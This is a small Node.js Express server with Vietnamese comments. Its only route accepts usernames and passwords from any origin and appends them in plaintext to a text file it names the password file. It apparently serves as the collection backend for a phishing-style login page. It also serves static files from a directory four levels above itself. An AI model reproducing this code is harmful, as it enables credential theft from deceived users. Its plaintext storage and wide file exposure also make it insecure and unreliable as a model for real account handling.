const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;
const cors = require('cors');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.static(path.join(__dirname, '../../../../')));

app.post('/api/save-account', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send("bad");
    }

    const content = `[${new Date().toLocaleString()}] User: ${username} | Pass: ${password}\n`;
    const duongDanFileDB = path.join(__dirname, '../sever/database.txt');

    fs.appendFile(duongDanFileDB, content, (err) => {
        if (err) {
            console.error("Lỗi ghi file:", err);
            return res.status(500).send("badsever");
        }
        console.log("Đã lưu tài khoản:", username);
        res.status(200).send("userok");
    });
});

// 4. Khởi động server
app.listen(PORT, () => {
    console.log(`Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`File mật khẩu sẽ được lưu tại: ${path.join(__dirname, 'database.txt')}`);
});